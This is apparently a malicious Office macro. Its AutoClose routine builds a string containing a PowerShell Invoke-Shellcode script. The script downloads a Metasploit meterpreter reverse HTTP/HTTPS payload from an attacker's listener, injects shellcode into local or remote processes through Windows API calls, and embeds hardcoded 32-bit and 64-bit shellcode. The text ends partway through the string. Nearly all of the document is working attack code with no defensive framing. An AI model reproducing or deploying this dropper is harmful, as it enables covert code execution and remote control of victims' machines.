Sub AutoClose()
        UdZ
End Sub

Public Function UdZ() As Variant
        Dim VU As String
        VU = "function Invoke-Shellcode
{
[CmdletBinding( Defaul"
        VU = VU + "tParameterSetName = 'RunLocal', SupportsShouldProc"
        VU = VU + "ess = $True , ConfirmImpact = 'High')] Param (
   "
        VU = VU + " [ValidateNotNullOrEmpty()]
    [UInt16]
    $Proc"
        VU = VU + "essID,
    [Parameter( ParameterSetName = 'RunLoca"
        VU = VU + "l' )]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
"
        VU = VU + "    $Shellcode,
    [Parameter( ParameterSetName ="
        VU = VU + " 'Metasploit' )]
    [ValidateSet( 'windows/meterp"
        VU = VU + "reter/reverse_http',
                  'windows/me"
        VU = VU + "terpreter/reverse_https',
                  Ignore"
        VU = VU + "Case = $True )]
    [String]
    $Payload = 'windo"
        VU = VU + "ws/meterpreter/reverse_http',
    [Parameter( Para"
        VU = VU + "meterSetName = 'ListPayloads' )]
    [Switch]
    "
        VU = VU + "$ListMetasploitPayloads,
    [Parameter( Mandatory"
        VU = VU + " = $True,
                ParameterSetName = 'Meta"
        VU = VU + "sploit' )]
    [ValidateNotNullOrEmpty()]
    [Str"
        VU = VU + "ing]
    $Lhost = '127.0.0.1',
    [Parameter( Man"
        VU = VU + "datory = $True,
                ParameterSetName ="
        VU = VU + " 'Metasploit' )]
    [ValidateRange( 1,65535 )]
  "
        VU = VU + "  [Int]
    $Lport = 8443,
    [Parameter( Paramet"
        VU = VU + "erSetName = 'Metasploit' )]
    [ValidateNotNull()"
        VU = VU + "]
    [String]
    $UserAgent = (Get-ItemProperty "
        VU = VU + "-Path 'HKCU:\Software\Microsoft\Windows\CurrentVer"
        VU = VU + "sion\Internet Settings').'User Agent',
    [Parame"
        VU = VU + "ter( ParameterSetName = 'Metasploit' )]
    [Valid"
        VU = VU + "ateNotNull()]
    [Switch]
    $Legacy = $False,
 "
        VU = VU + "   [Parameter( ParameterSetName = 'Metasploit' )]
"
        VU = VU + "    [ValidateNotNull()]
    [Switch]
    $Proxy = "
        VU = VU + "$False,
    [Switch]
    $Force = $False
)
    Set"
        VU = VU + "-StrictMode -Version 2.0
    if ($PsCmdlet.Paramet"
        VU = VU + "erSetName -eq 'ListPayloads')
    {
        $Avail"
        VU = VU + "ablePayloads = (Get-Command Invoke-Shellcode).Para"
        VU = VU + "meters['Payload'].Attributes |
            Where-O"
        VU = VU + "bject {$_.TypeId -eq [System.Management.Automation"
        VU = VU + ".ValidateSetAttribute]}
        foreach ($Payload "
        VU = VU + "in $AvailablePayloads.ValidValues)
        {
     "
        VU = VU + "       New-Object PSObject -Property @{ Payloads ="
        VU = VU + " $Payload }
        }
        Return
    }
    if "
        VU = VU + "( $PSBoundParameters['ProcessID'] )
    {
        "
        VU = VU + "Get-Process -Id $ProcessID -ErrorAction Stop | Out"
        VU = VU + "-Null
    }
    function Local:Get-DelegateType
  "
        VU = VU + "  {
        Param
        (
            [OutputTyp"
        VU = VU + "e([Type])]
            [Parameter( Position = 0)]
"
        VU = VU + "            [Type[]]
            $Parameters = (Ne"
        VU = VU + "w-Object Type[](0)),
            [Parameter( Posit"
        VU = VU + "ion = 1 )]
            [Type]
            $ReturnT"
        VU = VU + "ype = [Void]
        )
        $Domain = [AppDomai"
        VU = VU + "n]::CurrentDomain
        $DynAssembly = New-Objec"
        VU = VU + "t System.Reflection.AssemblyName('ReflectedDelegat"
        VU = VU + "e')
        $AssemblyBuilder = $Domain.DefineDynam"
        VU = VU + "icAssembly($DynAssembly, [System.Reflection.Emit.A"
        VU = VU + "ssemblyBuilderAccess]::Run)
        $ModuleBuilder"
        VU = VU + " = $AssemblyBuilder.DefineDynamicModule('InMemoryM"
        VU = VU + "odule', $false)
        $TypeBuilder = $ModuleBuil"
        VU = VU + "der.DefineType('MyDelegateType', 'Class, Public, S"
        VU = VU + "ealed, AnsiClass, AutoClass', [System.MulticastDel"
        VU = VU + "egate])
        $ConstructorBuilder = $TypeBuilder"
        VU = VU + ".DefineConstructor('RTSpecialName, HideBySig, Publ"
        VU = VU + "ic', [System.Reflection.CallingConventions]::Stand"
        VU = VU + "ard, $Parameters)
        $ConstructorBuilder.SetI"
        VU = VU + "mplementationFlags('Runtime, Managed')
        $Me"
        VU = VU + "thodBuilder = $TypeBuilder.DefineMethod('Invoke', "
        VU = VU + "'Public, HideBySig, NewSlot, Virtual', $ReturnType"
        VU = VU + ", $Parameters)
        $MethodBuilder.SetImplement"
        VU = VU + "ationFlags('Runtime, Managed')
        Write-Outpu"
        VU = VU + "t $TypeBuilder.CreateType()
    }
    function Loc"
        VU = VU + "al:Get-ProcAddress
    {
        Param
        (
 "
        VU = VU + "           [OutputType([IntPtr])]
            [Par"
        VU = VU + "ameter( Position = 0, Mandatory = $True )]
       "
        VU = VU + "     [String]
            $Module,
            [Pa"
        VU = VU + "rameter( Position = 1, Mandatory = $True )]
      "
        VU = VU + "      [String]
            $Procedure
        )
  "
        VU = VU + "      $SystemAssembly = [AppDomain]::CurrentDomain"
        VU = VU + ".GetAssemblies() |
            Where-Object { $_.G"
        VU = VU + "lobalAssemblyCache -And $_.Location.Split('\\')[-1"
        VU = VU + "].Equals('System.dll') }
        $UnsafeNativeMeth"
        VU = VU + "ods = $SystemAssembly.GetType('Microsoft.Win32.Uns"
        VU = VU + "afeNativeMethods')
        $GetModuleHandle = $Uns"
        VU = VU + "afeNativeMethods.GetMethod('GetModuleHandle')
    "
        VU = VU + "    $GetProcAddress = $UnsafeNativeMethods.GetMeth"
        VU = VU + "od('GetProcAddress', [Type[]]@([System.Runtime.Int"
        VU = VU + "eropServices.HandleRef], [String]))
        $Kern3"
        VU = VU + "2Handle = $GetModuleHandle.Invoke($null, @($Module"
        VU = VU + "))
        $tmpPtr = New-Object IntPtr
        $Ha"
        VU = VU + "ndleRef = New-Object System.Runtime.InteropService"
        VU = VU + "s.HandleRef($tmpPtr, $Kern32Handle)
        Write-"
        VU = VU + "Output $GetProcAddress.Invoke($null, @([System.Run"
        VU = VU + "time.InteropServices.HandleRef]$HandleRef, $Proced"
        VU = VU + "ure))
    }
    function Local:Emit-CallThreadStub"
        VU = VU + " ([IntPtr] $BaseAddr, [IntPtr] $ExitThreadAddr, [I"
        VU = VU + "nt] $Architecture)
    {
        $IntSizePtr = $Ar"
        VU = VU + "chitecture / 8
        function Local:ConvertTo-Li"
        VU = VU + "ttleEndian ([IntPtr] $Address)
        {
         "
        VU = VU + "   $LittleEndianByteArray = New-Object Byte[](0)
 "
        VU = VU + "           $Address.ToString("X$($IntSizePtr*2)") "
        VU = VU + "-split '([A-F0-9]{2})' | ForEach-Object { if ($_) "
        VU = VU + "{ $LittleEndianByteArray += [Byte] ('0x{0}' -f $_)"
        VU = VU + " } }
            [System.Array]::Reverse($LittleEn"
        VU = VU + "dianByteArray)
            Write-Output $LittleEnd"
        VU = VU + "ianByteArray
        }
        $CallStub = New-Obj"
        VU = VU + "ect Byte[](0)
        if ($IntSizePtr -eq 8)
     "
        VU = VU + "   {
            [Byte[]] $CallStub = 0x48,0xB8   "
        VU = VU + "                   # MOV   QWORD RAX, &shellcode
 "
        VU = VU + "           $CallStub += ConvertTo-LittleEndian $Ba"
        VU = VU + "seAddr       # &shellcode
            $CallStub +="
        VU = VU + " 0xFF,0xD0                              # CALL  RA"
        VU = VU + "X
            $CallStub += 0x6A,0x00              "
        VU = VU + "                # PUSH  BYTE 0
            $CallSt"
        VU = VU + "ub += 0x48,0xB8                              # MOV"
        VU = VU + "   QWORD RAX, &ExitThread
            $CallStub +="
        VU = VU + " ConvertTo-LittleEndian $ExitThreadAddr # &ExitThr"
        VU = VU + "ead
            $CallStub += 0xFF,0xD0            "
        VU = VU + "                  # CALL  RAX
        }
        el"
        VU = VU + "se
        {
            [Byte[]] $CallStub = 0xB8"
        VU = VU + "                           # MOV   DWORD EAX, &she"
        VU = VU + "llcode
            $CallStub += ConvertTo-LittleEn"
        VU = VU + "dian $BaseAddr       # &shellcode
            $Cal"
        VU = VU + "lStub += 0xFF,0xD0                              # "
        VU = VU + "CALL  EAX
            $CallStub += 0x6A,0x00      "
        VU = VU + "                        # PUSH  BYTE 0
           "
        VU = VU + " $CallStub += 0xB8                                "
        VU = VU + "   # MOV   DWORD EAX, &ExitThread
            $Cal"
        VU = VU + "lStub += ConvertTo-LittleEndian $ExitThreadAddr # "
        VU = VU + "&ExitThread
            $CallStub += 0xFF,0xD0    "
        VU = VU + "                          # CALL  EAX
        }
  "
        VU = VU + "      Write-Output $CallStub
    }
    function Lo"
        VU = VU + "cal:Inject-RemoteShellcode ([Int] $ProcessID)
    "
        VU = VU + "{
        $hProcess = $OpenProcess.Invoke(0x001F0F"
        VU = VU + "FF, $false, $ProcessID) # ProcessAccessFlags.All ("
        VU = VU + "0x001F0FFF)
        if (!$hProcess)
        {
    "
        VU = VU + "        Throw "Unable to open a process handle for"
        VU = VU + " PID: $ProcessID"
        }
        $IsWow64 = $fa"
        VU = VU + "lse
        if ($64bitCPU) # Only perform theses c"
        VU = VU + "hecks if CPU is 64-bit
        {
            $IsWo"
        VU = VU + "w64Process.Invoke($hProcess, [Ref] $IsWow64) | Out"
        VU = VU + "-Null
            if ((!$IsWow64) -and $PowerShell"
        VU = VU + "32bit)
            {
                Throw 'Unable"
        VU = VU + " to inject 64-bit shellcode from within 32-bit Pow"
        VU = VU + "ershell. Use the 64-bit version of Powershell if y"
        VU = VU + "ou want this to work.'
            }
            e"
        VU = VU + "lseif ($IsWow64) # 32-bit Wow64 process
          "
        VU = VU + "  {
                if ($Shellcode32.Length -eq 0)"
        VU = VU + "
                {
                    Throw 'No s"
        VU = VU + "hellcode was placed in the $Shellcode32 variable!'"
        VU = VU + "
                }
                $Shellcode = $S"
        VU = VU + "hellcode32
            }
            else # 64-bit"
        VU = VU + " process
            {
                if ($Shellc"
        VU = VU + "ode64.Length -eq 0)
                {
            "
        VU = VU + "        Throw 'No shellcode was placed in the $She"
        VU = VU + "llcode64 variable!'
                }
            "
        VU = VU + "    $Shellcode = $Shellcode64
            }
      "
        VU = VU + "  }
        else # 32-bit CPU
        {
          "
        VU = VU + "  if ($Shellcode32.Length -eq 0)
            {
   "
        VU = VU + "             Throw 'No shellcode was placed in the"
        VU = VU + " $Shellcode32 variable!'
            }
           "
        VU = VU + " $Shellcode = $Shellcode32
        }
        $Remo"
        VU = VU + "teMemAddr = $VirtualAllocEx.Invoke($hProcess, [Int"
        VU = VU + "Ptr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) #"
        VU = VU + " (Reserve|Commit, RWX)
        if (!$RemoteMemAddr"
        VU = VU + ")
        {
            Throw "Unable to allocate "
        VU = VU + "shellcode memory in PID: $ProcessID"
        }
   "
        VU = VU + "     $WriteProcessMemory.Invoke($hProcess, $Remote"
        VU = VU + "MemAddr, $Shellcode, $Shellcode.Length, [Ref] 0) |"
        VU = VU + " Out-Null
        $ExitThreadAddr = Get-ProcAddres"
        VU = VU + "s kernel32.dll ExitThread
        if ($IsWow64)
  "
        VU = VU + "      {
            $CallStub = Emit-CallThreadStu"
        VU = VU + "b $RemoteMemAddr $ExitThreadAddr 32
        }
    "
        VU = VU + "    else
        {
            $CallStub = Emit-Ca"
        VU = VU + "llThreadStub $RemoteMemAddr $ExitThreadAddr 64
   "
        VU = VU + "     }
        $RemoteStubAddr = $VirtualAllocEx.I"
        VU = VU + "nvoke($hProcess, [IntPtr]::Zero, $CallStub.Length,"
        VU = VU + " 0x3000, 0x40) # (Reserve|Commit, RWX)
        if "
        VU = VU + "(!$RemoteStubAddr)
        {
            Throw "Un"
        VU = VU + "able to allocate thread call stub memory in PID: $"
        VU = VU + "ProcessID"
        }
        $WriteProcessMemory.I"
        VU = VU + "nvoke($hProcess, $RemoteStubAddr, $CallStub, $Call"
        VU = VU + "Stub.Length, [Ref] 0) | Out-Null
        $ThreadHa"
        VU = VU + "ndle = $CreateRemoteThread.Invoke($hProcess, [IntP"
        VU = VU + "tr]::Zero, 0, $RemoteStubAddr, $RemoteMemAddr, 0, "
        VU = VU + "[IntPtr]::Zero)
        if (!$ThreadHandle)
      "
        VU = VU + "  {
            Throw "Unable to launch remote thr"
        VU = VU + "ead in PID: $ProcessID"
        }
        $CloseHa"
        VU = VU + "ndle.Invoke($hProcess) | Out-Null
    }
    functi"
        VU = VU + "on Local:Inject-LocalShellcode
    {
        if ($"
        VU = VU + "PowerShell32bit) {
            if ($Shellcode32.Le"
        VU = VU + "ngth -eq 0)
            {
                Throw 'N"
        VU = VU + "o shellcode was placed in the $Shellcode32 variabl"
        VU = VU + "e!'
                return
            }
         "
        VU = VU + "   $Shellcode = $Shellcode32
        }
        els"
        VU = VU + "e
        {
            if ($Shellcode64.Length -e"
        VU = VU + "q 0)
            {
                Throw 'No shell"
        VU = VU + "code was placed in the $Shellcode64 variable!'
   "
        VU = VU + "             return
            }
            $She"
        VU = VU + "llcode = $Shellcode64
        }
        $BaseAddre"
        VU = VU + "ss = $VirtualAlloc.Invoke([IntPtr]::Zero, $Shellco"
        VU = VU + "de.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RW"
        VU = VU + "X)
        if (!$BaseAddress)
        {
          "
        VU = VU + "  Throw "Unable to allocate shellcode memory in PI"
        VU = VU + "D: $ProcessID"
        }
        [System.Runtime.I"
        VU = VU + "nteropServices.Marshal]::Copy($Shellcode, 0, $Base"
        VU = VU + "Address, $Shellcode.Length)
        $ExitThreadAdd"
        VU = VU + "r = Get-ProcAddress kernel32.dll ExitThread
      "
        VU = VU + "  if ($PowerShell32bit)
        {
            $Cal"
        VU = VU + "lStub = Emit-CallThreadStub $BaseAddress $ExitThre"
        VU = VU + "adAddr 32
        }
        else
        {
       "
        VU = VU + "     $CallStub = Emit-CallThreadStub $BaseAddress "
        VU = VU + "$ExitThreadAddr 64
        }
        $CallStubAddr"
        VU = VU + "ess = $VirtualAlloc.Invoke([IntPtr]::Zero, $CallSt"
        VU = VU + "ub.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RW"
        VU = VU + "X)
        if (!$CallStubAddress)
        {
      "
        VU = VU + "      Throw "Unable to allocate thread call stub.""
        VU = VU + "
        }
        [System.Runtime.InteropServices"
        VU = VU + ".Marshal]::Copy($CallStub, 0, $CallStubAddress, $C"
        VU = VU + "allStub.Length)
        $ThreadHandle = $CreateThr"
        VU = VU + "ead.Invoke([IntPtr]::Zero, 0, $CallStubAddress, $B"
        VU = VU + "aseAddress, 0, [IntPtr]::Zero)
        if (!$Threa"
        VU = VU + "dHandle)
        {
            Throw "Unable to la"
        VU = VU + "unch thread."
        }
        $WaitForSingleObje"
        VU = VU + "ct.Invoke($ThreadHandle, 0xFFFFFFFF) | Out-Null
  "
        VU = VU + "      $VirtualFree.Invoke($CallStubAddress, $CallS"
        VU = VU + "tub.Length + 1, 0x8000) | Out-Null # MEM_RELEASE ("
        VU = VU + "0x8000)
        $VirtualFree.Invoke($BaseAddress, "
        VU = VU + "$Shellcode.Length + 1, 0x8000) | Out-Null # MEM_RE"
        VU = VU + "LEASE (0x8000)
    }
    $IsWow64ProcessAddr = Get"
        VU = VU + "-ProcAddress kernel32.dll IsWow64Process
    if ($"
        VU = VU + "IsWow64ProcessAddr)
    {
        $IsWow64ProcessD"
        VU = VU + "elegate = Get-DelegateType @([IntPtr], [Bool].Make"
        VU = VU + "ByRefType()) ([Bool])
        $IsWow64Process = [S"
        VU = VU + "ystem.Runtime.InteropServices.Marshal]::GetDelegat"
        VU = VU + "eForFunctionPointer($IsWow64ProcessAddr, $IsWow64P"
        VU = VU + "rocessDelegate)
        $64bitCPU = $true
    }
  "
        VU = VU + "  else
    {
        $64bitCPU = $false
    }
    "
        VU = VU + "if ([IntPtr]::Size -eq 4)
    {
        $PowerShel"
        VU = VU + "l32bit = $true
    }
    else
    {
        $Power"
        VU = VU + "Shell32bit = $false
    }
    if ($PsCmdlet.Parame"
        VU = VU + "terSetName -eq 'Metasploit')
    {
        if (!$P"
        VU = VU + "owerShell32bit) {
            $RootInvocation = $M"
        VU = VU + "yInvocation.Line
            $Response = $True
   "
        VU = VU + "         if ( $Force -or ( $Response = $psCmdlet.S"
        VU = VU + "houldContinue( "Do you want to launch the payload "
        VU = VU + "from x86 Powershell?",
                   "Attempt"
        VU = VU + " to execute 32-bit shellcode from 64-bit Powershel"
        VU = VU + "l. Note: This process takes about one minute. Be p"
        VU = VU + "atient! You will also see some artifacts of the sc"
        VU = VU + "ript loading in the other process." ) ) ) { }
    "
        VU = VU + "        if ( !$Response )
            {
          "
        VU = VU + "      Return
            }
            if ($MyInvo"
        VU = VU + "cation.BoundParameters['Force'])
            {
   "
        VU = VU + "             $Command = "function $($MyInvocation."
        VU = VU + "InvocationName) {`n" + $MyInvocation.MyCommand.Scr"
        VU = VU + "iptBlock + "`n}`n$($RootInvocation)`n`n"
         "
        VU = VU + "   }
            else
            {
              "
        VU = VU + "  $Command = "function $($MyInvocation.InvocationN"
        VU = VU + "ame) {`n" + $MyInvocation.MyCommand.ScriptBlock + "
        VU = VU + ""`n}`n$($RootInvocation) -Force`n`n"
            }"
        VU = VU + "
            $CommandBytes = [System.Text.Encoding"
        VU = VU + "]::Ascii.GetBytes($Command)
            $EncodedCo"
        VU = VU + "mmand = [Convert]::ToBase64String($CommandBytes)
 "
        VU = VU + "           $Execute = '$Command' + " | $Env:windir"
        VU = VU + "\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -N"
        VU = VU + "oProfile -Command -"
            Invoke-Expression"
        VU = VU + " -Command $Execute | Out-Null
            Return
 "
        VU = VU + "       }
        $Response = $True
        if ( $F"
        VU = VU + "orce -or ( $Response = $psCmdlet.ShouldContinue( ""
        VU = VU + "Do you know what you're doing?",
               "A"
        VU = VU + "bout to download Metasploit payload '$($Payload)' "
        VU = VU + "LHOST=$($Lhost), LPORT=$($Lport)" ) ) ) { }
      "
        VU = VU + "  if ( !$Response )
        {
            Return
 "
        VU = VU + "       }
        switch ($Payload)
        {
     "
        VU = VU + "       'windows/meterpreter/reverse_http'
        "
        VU = VU + "    {
                $SSL = ''
            }
    "
        VU = VU + "        'windows/meterpreter/reverse_https'
      "
        VU = VU + "      {
                $SSL = 's'
               "
        VU = VU + " [System.Net.ServicePointManager]::ServerCertifica"
        VU = VU + "teValidationCallback = {$True}
            }
     "
        VU = VU + "   }
        if ($Legacy)
        {
            $R"
        VU = VU + "equest = "http$($SSL)://$($Lhost):$($Lport)/INITM""
        VU = VU + "
        } else {
            $CharArray = 48..57 "
        VU = VU + "+ 65..90 + 97..122 | ForEach-Object {[Char]$_}
   "
        VU = VU + "         $SumTest = $False
            while ($Sum"
        VU = VU + "Test -eq $False)
            {
                $Ge"
        VU = VU + "neratedUri = $CharArray | Get-Random -Count 4
    "
        VU = VU + "            $SumTest = (([int[]] $GeneratedUri | M"
        VU = VU + "easure-Object -Sum).Sum % 0x100 -eq 92)
          "
        VU = VU + "  }
            $RequestUri = -join $GeneratedUri
"
        VU = VU + "            $Request = "http$($SSL)://$($Lhost):$("
        VU = VU + "$Lport)/$($RequestUri)"
        }
        $Uri = N"
        VU = VU + "ew-Object Uri($Request)
        $WebClient = New-O"
        VU = VU + "bject System.Net.WebClient
        $WebClient.Head"
        VU = VU + "ers.Add('user-agent', "$UserAgent")
        if ($P"
        VU = VU + "roxy)
        {
            $WebProxyObject = New-"
        VU = VU + "Object System.Net.WebProxy
            $ProxyAddre"
        VU = VU + "ss = (Get-ItemProperty -Path 'HKCU:\Software\Micro"
        VU = VU + "soft\Windows\CurrentVersion\Internet Settings').Pr"
        VU = VU + "oxyServer
            if ($ProxyAddress)
         "
        VU = VU + "   {
                $WebProxyObject.Address = $Pr"
        VU = VU + "oxyAddress
                $WebProxyObject.UseDefa"
        VU = VU + "ultCredentials = $True
                $WebClientO"
        VU = VU + "bject.Proxy = $WebProxyObject
            }
      "
        VU = VU + "  }
        try
        {
            [Byte[]] $Sh"
        VU = VU + "ellcode32 = $WebClient.DownloadData($Uri)
        "
        VU = VU + "}
        catch
        {
            Throw "$($Er"
        VU = VU + "ror[0])"
        }
        [Byte[]] $Shellcode64 ="
        VU = VU + " $Shellcode32
    }
    elseif ($PSBoundParameters"
        VU = VU + "['Shellcode'])
    {
        [Byte[]] $Shellcode32"
        VU = VU + " = $Shellcode
        [Byte[]] $Shellcode64 = $She"
        VU = VU + "llcode32
    }
    else
    {
        [Byte[]] $Sh"
        VU = VU + "ellcode32 = @(0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0"
        VU = VU + "x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,
     "
        VU = VU + "                             0x52,0x0c,0x8b,0x52,0"
        VU = VU + "x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0"
        VU = VU + "x31,0xc0,
                                  0xac,0"
        VU = VU + "x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0"
        VU = VU + "xc7,0xe2,0xf0,0x52,0x57,
                         "
        VU = VU + "         0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0"
        VU = VU + "x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,
          "
        VU = VU + "                        0xd0,0x50,0x8b,0x48,0x18,0"
        VU = VU + "x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0"
        VU = VU + "x8b,
                                  0x01,0xd6,0"
        VU = VU + "x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0"
        VU = VU + "x38,0xe0,0x75,0xf4,
                              "
        VU = VU + "    0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0"
        VU = VU + "x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
               "
        VU = VU + "                   0x0c,0x4b,0x8b,0x58,0x1c,0x01,0"
        VU = VU + "xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,
"
        VU = VU + "                                  0x5b,0x5b,0x61,0"
        VU = VU + "x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0"
        VU = VU + "xeb,0x86,0x5d,
                                  0"
        VU = VU + "x6a,0x01,0x8d,0x85,0xb9,0x00,0x00,0x00,0x50,0x68,0"
        VU = VU + "x31,0x8b,0x6f,0x87,0xff,0xd5,
                    "
        VU = VU + "              0xbb,0xe0,0x1d,0x2a,0x0a,0x68,0xa6,0"
        VU = VU + "x95,0xbd,0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,
     "
        VU = VU + "                             0x80,0xfb,0xe0,0x75,0"
        VU = VU + "x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0"
        VU = VU + "xd5,0x63,
                                  0x61,0"
        VU = VU + "x6c,0x63,0x00)
        [Byte[]] $Shellcode64 = @(0"
        VU = VU + "xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0"
        VU = VU + "x41,0x51,0x41,0x50,0x52,0x51,
                    "
        VU = VU + "              0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0"
        VU = VU + "x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,
     "
        VU = VU + "                             0x20,0x48,0x8b,0x72,0"
        VU = VU + "x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0"
        VU = VU + "x31,0xc0,
                                  0xac,0"
        VU = VU + "x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0"
        VU = VU + "x41,0x01,0xc1,0xe2,0xed,
                         "
        VU = VU + "         0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0"
        VU = VU + "x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,
          "
        VU = VU + "                        0x00,0x00,0x00,0x48,0x85,0"
        VU = VU + "xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0"
        VU = VU + "x44,
                                  0x8b,0x40,0"
        VU = VU + "x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0"
        VU = VU + "x8b,0x34,0x88,0x48,
                              "
        VU = VU + "    0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0"
        VU = VU + "x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,
               "
        VU = VU + "                   0x38,0xe0,0x75,0xf1,0x4c,0x03,0"
        VU = VU + "x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,
"
        VU = VU + "                                  0x8b,0x40,0x24,0"
        VU = VU + "x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0"
        VU = VU + "x40,0x1c,0x49,
                                  0"
        VU = VU + "x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0"
        VU = VU + "x58,0x41,0x58,0x5e,0x59,0x5a,
                    "
        VU = VU + "              0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0"
        VU = VU + "x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
     "
        VU = VU + "                             0x59,0x5a,0x48,0x8b,0"
        VU = VU + "x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0"
        VU = VU + "x00,0x00,
                                  0x00,0"
        VU = VU + "x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0"
        VU = VU + "x00,0x41,0xba,0x31,0x8b,
                         "
        VU = VU + "         0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0"
        VU = VU + "x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
          "
        VU = VU + "                        0xd5,0x48,0x83,0xc4,0x28,0"
        VU = VU + "x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0"
        VU = VU + "x47,
                                  0x13,0x72,0"
        VU = VU + "x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0"
        VU = VU + "x61,0x6c,0x63,0x00)
    }
    if ( $PSBoundParamet"
        VU = VU + "ers['ProcessID'] )
    {
        $OpenProcessAddr "
        VU = VU + "= Get-ProcAddress kernel32.dll OpenProcess
       "
        VU = VU + " $OpenProcessDelegate = Get-DelegateType @([UInt32"
        VU = VU + "], [Bool], [UInt32]) ([IntPtr])
        $OpenProce"
        VU = VU + "ss = [System.Runtime.InteropServices.Marshal]::Get"
        VU = VU + "DelegateForFunctionPointer($OpenProcessAddr, $Open"
        VU = VU + "ProcessDelegate)
        $VirtualAllocExAddr = Get"
        VU = VU + "-ProcAddress kernel32.dll VirtualAllocEx
        $"
        VU = VU + "VirtualAllocExDelegate = Get-DelegateType @([IntPt"
        VU = VU + "r], [IntPtr], [Uint32], [UInt32], [UInt32]) ([IntP"
        VU = VU + "tr])
        $VirtualAllocEx = [System.Runtime.Int"
        VU = VU + "eropServices.Marshal]::GetDelegateForFunctionPoint"
        VU = VU + "er($VirtualAllocExAddr, $VirtualAllocExDelegate)
 "
        VU = VU + "       $WriteProcessMemoryAddr = Get-ProcAddress k"
        VU = VU + "ernel32.dll WriteProcessMemory
        $WriteProce"
        VU = VU + "ssMemoryDelegate = Get-DelegateType @([IntPtr], [I"
        VU = VU + "ntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType"
        VU = VU + "()) ([Bool])
        $WriteProcessMemory = [System"
        VU = VU + ".Runtime.InteropServices.Marshal]::GetDelegateForF"
        VU = VU + "unctionPointer($WriteProcessMemoryAddr, $WriteProc"
        VU = VU + "essMemoryDelegate)
        $CreateRemoteThreadAddr"
        VU = VU + " = Get-ProcAddress kernel32.dll CreateRemoteThread"
        VU = VU + "
        $CreateRemoteThreadDelegate = Get-Delegat"
        VU = VU + "eType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [I"
        VU = VU + "ntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $Cr"
        VU = VU + "eateRemoteThread = [System.Runtime.InteropServices"
        VU = VU + ".Marshal]::GetDelegateForFunctionPointer($CreateRe"
        VU = VU + "moteThreadAddr, $CreateRemoteThreadDelegate)
     "
        VU = VU + "   $CloseHandleAddr = Get-ProcAddress kernel32.dll"
        VU = VU + " CloseHandle
        $CloseHandleDelegate = Get-De"
        VU = VU + "legateType @([IntPtr]) ([Bool])
        $CloseHand"
        VU = VU + "le = [System.Runtime.InteropServices.Marshal]::Get"
        VU = VU + "DelegateForFunctionPointer($CloseHandleAddr, $Clos"
        VU = VU + "eHandleDelegate)
        if ( $Force -or $psCmdlet"
        VU = VU + ".ShouldContinue( 'Do you wish to carry out your ev"
        VU = VU + "il plans?',
                 "Injecting shellcode "
        VU = VU + "injecting into $((Get-Process -Id $ProcessId).Proc"
        VU = VU + "essName) ($ProcessId)!" ) )
        {
            "
        VU = VU + "Inject-RemoteShellcode $ProcessId
        }
    }
"
        VU = VU + "    else
    {
        $VirtualAllocAddr = Get-Pro"
        VU = VU + "cAddress kernel32.dll VirtualAlloc
        $Virtua"
        VU = VU + "lAllocDelegate = Get-DelegateType @([IntPtr], [UIn"
        VU = VU + "t32], [UInt32], [UInt32]) ([IntPtr])
        $Virt"
        VU = VU + "ualAlloc = [System.Runtime.InteropServices.Marshal"
        VU = VU + "]::GetDelegateForFunctionPointer($VirtualAllocAddr"
        VU = VU + ", $VirtualAllocDelegate)
        $VirtualFreeAddr "
        VU = VU + "= Get-ProcAddress kernel32.dll VirtualFree
       "
        VU = VU + " $VirtualFreeDelegate = Get-DelegateType @([IntPtr"
        VU = VU + "], [Uint32], [UInt32]) ([Bool])
        $VirtualFr"
